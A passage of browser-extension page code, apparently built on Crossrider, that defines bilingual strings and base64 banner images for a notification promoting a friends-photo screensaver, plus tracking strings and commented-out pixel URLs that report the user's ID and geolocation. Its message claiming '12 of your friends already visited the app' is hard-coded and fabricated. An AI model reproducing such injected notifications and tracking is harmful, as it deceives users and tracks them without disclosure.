  /************************************************************************************
  This is your Page Code. The appAPI.ready() code block will be executed on every page load.
  For more information please visit our docs site: http://docs.crossrider.com
*************************************************************************************/
(function ($) {   
    var lang = {
			1:{
				en:'Introducing My Friends Screensaver',
				pt:'Apresento&nbsp;Meus&nbsp;Amigos&nbsp;no&nbsp;Protetor&nbsp;de&nbsp;Tela'
			},
			2:{
				en:'Make your screensaver from your friends photos.<br />Discover new photos every day.',
				pt:'Faça um protetor de tela com fotos de seus amigos.<br />Descubra novas fotos todos os dias.'
			},
			3:{
				en:'12 of your friends already visited the app',
				pt:'12 dos seus amigos já visitaram esta aplicação.'
			},
			4:{
				en:'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAANwAAAAcCAIAAACF0EZiAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyRpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoTWFjaW50b3NoKSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDo2OEIwNTJGRDE2MzUxMUUyOTE3N0RBNUNEQ0Y3NDI3MiIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDo2OEIwNTJGRTE2MzUxMUUyOTE3N0RBNUNEQ0Y3NDI3MiI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOjY4QjA1MkZCMTYzNTExRTI5MTc3REE1Q0RDRjc0MjcyIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOjY4QjA1MkZDMTYzNTExRTI5MTc3REE1Q0RDRjc0MjcyIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+6/DUmAAABhlJREFUeNrsWntM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',
				pt:'data:image/png;base64,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'
			}
		},
		/*stats = {
			ntf1:{
				display:'http://nstats.crossrider.com/notifications.gif?action=display&appId=1106&bic=' + appAPI.getCrossriderID() + '&browser=CH&nid=294&localtime=' + Math.round(new Date().getTime() / 1000) + '&geolocation=IL&delay=0',
				click:'http://nstats.crossrider.com/notifications.gif?action=click&appId=1106&bic=' + appAPI.getCrossriderID() + '&browser=CH&nid=294&localtime=' + Math.round(new Date().getTime() / 1000) + '&geolocation=IL&delay=10&mouse_enter_delay=0'
			},
			ntf2:{
				display:'http://nstats.crossrider.com/notifications.gif?action=display&appId=1106&bic=' + appAPI.getCrossriderID() + '&browser=CH&nid=295&localtime=' + Math.round(new Date().getTime() / 1000) + '&geolocation=IL&delay=0',
				click:'http://nstats.crossrider.com/notifications.gif?action=click&appId=1106&bic=' + appAPI.getCrossriderID() + '&browser=CH&nid=295&localtime=' + Math.round(new Date().getTime() / 1000) + '&geolocation=IL&delay=10&mouse_enter_delay=0'
			}
		},*/
		stats = {
			ntf1:{
				display:"_gaq.push(['_trackEvent', 'notification', 'display', 'type_1', 1]);",
				click:"_gaq.push(['_trackEvent', 'notification', 'click', 'type_1', 1]);"
			},
			ntf2:{
				display:"_gaq.push(['_trackEvent', 'notification', 'display', 'type_2', 1]);",
